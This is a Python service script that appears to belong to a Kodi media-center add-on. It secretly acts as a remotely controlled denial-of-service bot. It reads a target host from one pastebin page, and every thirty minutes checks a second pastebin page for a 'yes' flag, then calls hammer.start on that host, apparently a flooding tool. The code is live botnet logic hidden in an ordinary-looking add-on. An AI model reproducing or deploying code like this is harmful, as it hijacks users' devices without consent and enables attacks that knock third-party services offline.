import hammer, urllib2, xbmc

def getPage(page):                                
    url = page                                                           
    try:                                                                 
        req = urllib2.Request(url ,None)                                                                          
        req.add_header('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8')               
        req.add_header('Accept-Language', 'nl,en-US;q=0.7,en;q=0.3')                                              
        req.add_header('Accept-Encoding', 'deflate')                                                        
        req.add_header('Connection', 'keep-alive')                                                                
        response = urllib2.urlopen(req)                                            
        data = response.read()                                                                                    
        response.close()                                                                                          
        return str(data)                                                                           
    except :                                                                                       
        return 'no'                                                                                  

def go(host) :
    while getPage('http://pastebin.com/raw.php?i=XWcY72pK') == 'yes' :
        hammer.start(host)

if __name__ == '__main__':
    host = getPage('http://pastebin.com/raw.php?i=ggRigkeP')
    monitor = xbmc.Monitor()
    go(host)
    while True:
        # Sleep/wait for abort for 1800 seconds = 30 minutes
        if monitor.waitForAbort(1800):
            # Abort was requested while waiting. We should exit
            break
        go(host)

